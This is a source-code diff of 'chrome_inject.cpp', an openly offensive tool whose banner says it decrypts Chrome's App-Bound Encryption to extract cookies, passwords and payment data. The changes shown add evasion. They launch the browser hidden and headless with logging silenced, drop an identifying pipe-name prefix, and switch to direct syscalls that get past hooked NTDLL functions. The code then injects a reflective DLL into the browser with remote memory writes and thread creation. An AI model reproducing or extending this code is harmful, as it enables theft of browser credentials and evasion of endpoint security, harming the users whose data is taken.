@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.12.1 (c) Alexander 'xaitax' Hagenah
+// v0.13.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -145,7 +145,7 @@ namespace Injector
                       << "|  Chrome App-Bound Encryption Decryption      |\n"
                       << "|  Direct Syscall Injection Engine             |\n"
                       << "|  x64 & ARM64 | Cookies, Passwords, Payments  |\n"
-                      << "|  v0.12.1 by @xaitax                          |\n"
+                      << "|  v0.13.0 by @xaitax                          |\n"
                       << "------------------------------------------------\n\n";
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
         }
@@ -226,7 +226,7 @@ namespace Injector
             UuidCreate(&uuid);
             wchar_t *uuidStrRaw = nullptr;
             UuidToStringW(&uuid, (RPC_WSTR *)&uuidStrRaw);
-            std::wstring pipeName = L"\\\\.\\pipe\\ChromeDecryptIPC_";
+            std::wstring pipeName = L"\\\\.\\pipe\\";
             pipeName += uuidStrRaw;
             RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
             return pipeName;
@@ -376,11 +376,27 @@ namespace Injector
 
         bool StartProcess(const std::wstring &exePath, DWORD &outPid)
         {
-            UI::LogDebug("Attempting to launch: " + Utils::WStringToUtf8(exePath));
+            HANDLE hNull = CreateFileW(L"NUL:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                       NULL, OPEN_EXISTING, 0, NULL);
+            if (hNull == INVALID_HANDLE_VALUE)
+            {
+                UI::LogDebug("Failed to open NUL device for output redirection. Error: " + std::to_string(GetLastError()));
+                return false;
+            }
+            HandleGuard nullGuard(hNull);
+
             STARTUPINFOW si{};
             PROCESS_INFORMATION pi{};
             si.cb = sizeof(si);
-            if (!CreateProcessW(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi))
+            si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+            si.wShowWindow = SW_HIDE;
+            si.hStdInput = hNull;
+            si.hStdOutput = hNull;
+            si.hStdError = hNull;
+
+            std::wstring cmdLine = L"\"" + exePath + L"\" --headless --disable-logging --log-level=3 --v=0";
+
+            if (!CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi))
             {
                 UI::LogDebug("CreateProcessW failed. Error: " + std::to_string(GetLastError()));
                 return false;
@@ -392,7 +408,6 @@ namespace Injector
             outPid = pi.dwProcessId;
             return true;
         }
-
     }
 
     namespace RDI
@@ -454,7 +469,7 @@ namespace Injector
 
             LPVOID remoteMem = nullptr;
             SIZE_T regionSize = dllBuffer.size();
-            NTSTATUS status = g_syscall_stubs.NtAllocateVirtualMemory(proc, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            NTSTATUS status = NtAllocateVirtualMemory_syscall(proc, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             if (!NT_SUCCESS(status))
             {
                 UI::PrintStatus("[-]", "RDI: NtAllocateVirtualMemory failed. Status: " + Utils::NtStatusToString(status));
@@ -467,24 +482,39 @@ namespace Injector
                 if (mem)
                 {
                     SIZE_T sizeToFree = 0;
-                    g_syscall_stubs.NtFreeVirtualMemory(proc, &mem, &sizeToFree, MEM_RELEASE);
+                    NtFreeVirtualMemory_syscall(proc, &mem, &sizeToFree, MEM_RELEASE);
                 }
             };
             std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remoteMem, remoteMemFreer);
 
             SIZE_T bytesWritten = 0;
-            status = g_syscall_stubs.NtWriteVirtualMemory(proc, remoteMem, (PVOID)dllBuffer.data(), dllBuffer.size(), &bytesWritten);
+            status = NtWriteVirtualMemory_syscall(proc, remoteMem, (PVOID)dllBuffer.data(), dllBuffer.size(), &bytesWritten);
             if (!NT_SUCCESS(status))
             {
                 UI::PrintStatus("[-]", "RDI: NtWriteVirtualMemory failed. Status: " + Utils::NtStatusToString(status));
                 return false;
             }
 
+            UI::LogDebug("RDI: Payload written to target memory. Bytes written: " + std::to_string(bytesWritten));
+
+            ULONG oldProtect = 0;
+            SIZE_T protectRegionSize = dllBuffer.size();
+            status = NtProtectVirtualMemory_syscall(proc, &remoteMem, &protectRegionSize, PAGE_EXECUTE_READ, &oldProtect);
+
+            if (!NT_SUCCESS(status))
+            {
+                UI::LogDebug("RDI: NtProtectVirtualMemory failed for PAGE_EXECUTE_READ. Status: " + Utils::NtStatusToString(status) + ". Memory remains PAGE_EXECUTE_READWRITE.");
+            }
+            else
+            {
+                UI::LogDebug("RDI: Memory permissions changed from 0x" + std::to_string(oldProtect) + " to PAGE_EXECUTE_READ (0x" + std::to_string(PAGE_EXECUTE_READ) + ").");
+            }
+
             ULONG_PTR remoteLoaderAddr = reinterpret_cast<ULONG_PTR>(remoteMem) + rdiOffset;
             UI::LogDebug("RDI: Calculated remote ReflectiveLoader address: " + Utils::PtrToHexStr((void *)remoteLoaderAddr));
 
             HANDLE hRemoteThread = nullptr;
-            status = g_syscall_stubs.NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, proc, (LPTHREAD_START_ROUTINE)remoteLoaderAddr, lpDllParameter, 0, 0, 0, 0, nullptr);
+            status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, proc, (LPTHREAD_START_ROUTINE)remoteLoaderAddr, lpDllParameter, 0, 0, 0, 0, nullptr);
             if (!NT_SUCCESS(status))
             {
                 UI::PrintStatus("[-]", "RDI: NtCreateThreadEx failed. Status: " + Utils::NtStatusToString(status));
@@ -727,7 +757,7 @@ namespace Injector
 
         if (!InitializeSyscalls(config.verbose))
         {
-            UI::PrintStatus("[-]", "Failed to initialize syscalls. Critical NTDLL functions might be hooked or missing.");
+            UI::PrintStatus("[-]", "Failed to initialize direct syscalls. Critical NTDLL functions might be hooked, missing, or gadgets not found.");
             return 1;
         }
 
@@ -799,34 +829,62 @@ namespace Injector
 
         LPVOID remotePipeNameAddr = nullptr;
         SIZE_T pipeNameSize = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
-        g_syscall_stubs.NtAllocateVirtualMemory(targetProcess.get(), &remotePipeNameAddr, 0, &pipeNameSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        UI::LogDebug("Calling NtAllocateVirtualMemory_syscall...");
+        NTSTATUS statusAlloc = NtAllocateVirtualMemory_syscall(
+            targetProcess.get(),
+            &remotePipeNameAddr,
+            0,
+            &pipeNameSize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE);
+        UI::LogDebug("NtAllocateVirtualMemory_syscall returned " + Utils::NtStatusToString(statusAlloc));
+        if (!NT_SUCCESS(statusAlloc))
+        {
+            UI::PrintStatus("[-]", "NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(statusAlloc));
+            return 1;
+        }
+
         auto remoteMemFreer = [&](LPVOID mem)
         {
             if (mem)
             {
                 SIZE_T sizeToFree = 0;
-                g_syscall_stubs.NtFreeVirtualMemory(targetProcess.get(), &mem, &sizeToFree, MEM_RELEASE);
+                NtFreeVirtualMemory_syscall(targetProcess.get(), &mem, &sizeToFree, MEM_RELEASE);
                 UI::LogDebug("Freed remote pipe name memory.");
             }
         };
         std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remotePipeNameAddr, remoteMemFreer);
 
-        if (!remotePipeNameAddr)
+        UI::LogDebug("Calling NtWriteVirtualMemory_syscall...");
+        NTSTATUS statusWrite = NtWriteVirtualMemory_syscall(
+            targetProcess.get(),
+            remotePipeNameAddr,
+            (PVOID)ipcPipeNameW.c_str(),
+            pipeNameSize,
+            nullptr);
+        UI::LogDebug("NtWriteVirtualMemory_syscall returned " + Utils::NtStatusToString(statusWrite));
+        if (!NT_SUCCESS(statusWrite))
         {
-            UI::PrintStatus("[-]", "Failed to allocate memory for pipe name in target process.");
+            UI::PrintStatus("[-]", "NtWriteVirtualMemory failed: " + Utils::NtStatusToString(statusWrite));
             return 1;
         }
 
-        g_syscall_stubs.NtWriteVirtualMemory(targetProcess.get(), remotePipeNameAddr, (PVOID)ipcPipeNameW.c_str(), pipeNameSize, nullptr);
-
         USHORT targetArch = 0;
         Process::GetProcessArchitecture(targetProcess.get(), targetArch);
-        if (!RDI::Inject(targetProcess.get(), dllBuffer, targetArch, remotePipeNameAddr))
+        UI::LogDebug("Calling RDI::Inject()...");
+        bool injected = RDI::Inject(
+            targetProcess.get(),
+            dllBuffer,
+            targetArch,
+            remotePipeNameAddr);
+        UI::LogDebug(std::string("RDI::Inject returned ") + (injected ? "true" : "false"));
+        if (!injected)
         {
             UI::PrintStatus("[-]", "Reflective DLL Injection failed.");
             return 1;
         }
-        UI::PrintStatus("[+]", "DLL injected via Reflective DLL Injection (RDI with Syscalls)");
+        UI::LogDebug("Reflective DLL Injection succeeded.");
 
         if (pipe.WaitForConnection())
         {
